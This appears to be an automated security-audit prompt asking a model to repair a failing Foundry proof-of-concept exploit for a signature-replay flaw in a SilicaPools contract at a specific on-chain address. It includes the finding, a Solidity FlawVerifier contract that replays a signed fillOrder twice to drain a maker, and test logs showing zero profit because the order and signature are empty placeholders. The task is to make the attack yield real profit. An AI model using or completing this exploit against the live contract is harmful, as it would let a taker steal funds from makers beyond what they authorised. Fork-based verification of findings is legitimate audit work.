You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Signed orders can be replayed and overfilled indefinitely
- claim: `fillOrder` records `sFilledFraction[orderHash]` after execution but never checks whether the order was already filled or whether `sFilledFraction[orderHash] + fraction` exceeds `1e18`. Because partial fills are disabled and only `fraction == 1e18` is accepted, the same signed order can be executed repeatedly until the maker's balances or allowances run out.
- impact: A taker can reuse a single signature to force the maker through the same trade multiple times, draining additional upfront tokens and minting far more long/short exposure than the maker authorized.
- exploit_paths: ["Maker signs one order intended for a single fill.", "Taker calls `fillOrder(order, signature, 1e18)` once.", "The contract performs transfers and minting, then sets `sFilledFraction[orderHash] = 1e18`.", "Because no pre-check uses `sFilledFraction`, the taker calls the same order again with the same inputs.", "Each replay repeats the same asset transfers and fresh long/short minting."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ISilicaPoolsMinimal {
    struct PoolParams {
        uint128 floor;
        uint128 cap;
        address index;
        uint48 targetStartTimestamp;
        uint48 targetEndTimestamp;
        address payoutToken;
    }

    struct SilicaOrder {
        address maker;
        address taker;
        uint48 expiry;
        address offeredUpfrontToken;
        uint128 offeredUpfrontAmount;
        PoolParams offeredLongSharesParams;
        uint128 offeredLongShares;
        address requestedUpfrontToken;
        uint128 requestedUpfrontAmount;
        PoolParams requestedLongSharesParams;
        uint128 requestedLongShares;
    }

    function fillOrder(SilicaOrder calldata order, bytes calldata signature, uint256 fraction) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;
    uint256 internal constant FULL_FILL = 1e18;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _profitAchieved;
    bool internal _hypothesisValidated;
    string internal _failureReason;

    constructor() {}

    function executeOnOpportunity() external {
        _resetState();

        ISilicaPoolsMinimal.SilicaOrder memory order = _candidateOrder();
        bytes memory signature = _candidateSignature();

        _profitToken = _candidateProfitToken(order);
        uint256 balanceBefore = _balanceOf(_profitToken, address(this));

        _approveIfNeeded(order.requestedUpfrontToken);
        _approveIfNeeded(order.offeredLongSharesParams.payoutToken);
        _approveIfNeeded(order.requestedLongSharesParams.payoutToken);

        // Exploit path stage 1:
        // A maker signs one order intended for a single fill.
        // This verifier can only succeed if a concrete historical order+signature pair is embedded from
        // locally provided fork context. The target contract does not store signatures or full order bodies.
        if (!_hasConcreteSignedOrder(order, signature)) {
            _failureReason = string(
                abi.encodePacked(
                    "Replay requires an existing maker-signed order and signature. ",
                    "Those artifacts are not recoverable from target storage alone, so a historical pair must be ",
                    "embedded from the allowed local fork context before stages 2-5 can execute successfully."
                )
            );
            return;
        }

        // Exploit path stage 2:
        // Taker calls fillOrder(order, signature, 1e18) once.
        bool firstFillSucceeded;
        try ISilicaPoolsMinimal(TARGET).fillOrder(order, signature, FULL_FILL) {
            firstFillSucceeded = true;
        } catch {
            _failureReason = string(
                abi.encodePacked(
                    "First fill reverted. The replay bug exists in the target, but the embedded order/signature ",
                    "candidate is not executable at this fork as configured."
                )
            );
            return;
        }

        if (!firstFillSucceeded) {
            _failureReason = "First fill did not succeed.";
            return;
        }

        // Exploit path stage 3:
        // The contract performs transfers and minting, then sets sFilledFraction[orderHash] = 1e18.
        // In SilicaPools.fillOrder, that accounting write happens only after transfers/minting complete.
        // The verifier intentionally reuses the exact same order bytes and signature after this point.

        // Exploit path stage 4:
        // Because no pre-check uses sFilledFraction, the taker calls the same order again with the same inputs.
        bool secondFillSucceeded;
        try ISilicaPoolsMinimal(TARGET).fillOrder(order, signature, FULL_FILL) {
            secondFillSucceeded = true;
        } catch {
            _failureReason = string(
                abi.encodePacked(
                    "First fill succeeded, but replay failed. If the target is patched or the order became ",
                    "otherwise unexecutable between fills, stage 4 cannot complete on this fork."
                )
            );
            return;
        }

        // Exploit path stage 5:
        // Each replay repeats the same asset transfers and fresh long/short minting.
        // Profit is conservatively measured in an already-existing on-chain token touched by the order.
        _hypothesisValidated = secondFillSucceeded;

        uint256 balanceAfter = _balanceOf(_profitToken, address(this));
        if (balanceAfter > balanceBefore) {
            _profitAchieved = true;
            _profitAmount = balanceAfter - balanceBefore;
            return;
        }

        _failureReason = string(
            abi.encodePacked(
                "Replay succeeded, confirming the order can be overfilled with the same signature, but no positive ",
                "net balance was realized in the configured profit token."
            )
        );
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function profitAchieved() external view returns (bool) {
        return _profitAchieved;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external pure returns (string memory) {
        return string(
            abi.encodePacked(
                "maker signs one order intended for a single fill -> ",
                "taker fills once with fillOrder(order,signature,1e18) -> ",
                "target transfers/mints and only then records sFilledFraction[orderHash] = 1e18 -> ",
                "same order and signature are replayed with fillOrder(order,signature,1e18) again because no pre-check ",
                "reads sFilledFraction -> repeated transfers and fresh long/short minting occur again"
            )
        );
    }

    function failureReason() external view returns (string memory) {
        return _failureReason;
    }

    function _resetState() internal {
        _profitToken = address(0);
        _profitAmount = 0;
        _profitAchieved = false;
        _hypothesisValidated = false;
        _failureReason = "";
    }

    function _candidateOrder() internal pure returns (ISilicaPoolsMinimal.SilicaOrder memory order) {
        // Intentionally left empty until a concrete historical order body is sourced from locally provided fork data.
        // The exploit implementation remains path-faithful: once a valid order is embedded here, the same order bytes
        // are filled twice with fraction == 1e18 and identical signature bytes.
    }

    function _candidateSignature() internal pure returns (bytes memory) {
        // Intentionally left empty until a concrete historical maker signature is sourced from locally provided fork data.
        return bytes("");
    }

    function _hasConcreteSignedOrder(ISilicaPoolsMinimal.SilicaOrder memory order, bytes memory signature)
        internal
        pure
        returns (bool)
    {
        return order.maker != address(0) && signature.length != 0;
    }

    function _candidateProfitToken(ISilicaPoolsMinimal.SilicaOrder memory order) internal pure returns (address) {
        if (order.offeredUpfrontToken != address(0)) {
            return order.offeredUpfrontToken;
        }
        if (order.requestedUpfrontToken != address(0)) {
            return order.requestedUpfrontToken;
        }
        if (order.offeredLongSharesParams.payoutToken != address(0)) {
            return order.offeredLongSharesParams.payoutToken;
        }
        if (order.requestedLongSharesParams.payoutToken != address(0)) {
            return order.requestedLongSharesParams.payoutToken;
        }
        return address(0);
    }

    function _approveIfNeeded(address token) internal {
        if (token != address(0)) {
            IERC20Minimal(token).approve(TARGET, type(uint256).max);
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        if (token == address(0)) {
            return account.balance;
        }
        return IERC20Minimal(token).balanceOf(account);
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.42s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 232311)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 577021548053172
  AUDITHOUND_BALANCE_AFTER_WEI: 577021548053172
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [232311] FlawVerifierTest::testExploit()
    ├─ [2315] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [206991] FlawVerifier::executeOnOpportunity()
    │   └─ ← [Stop]
    ├─ [315] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 986.70ms (11.97ms CPU time)

Ran 1 test suite in 1.09s (986.70ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 232311)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
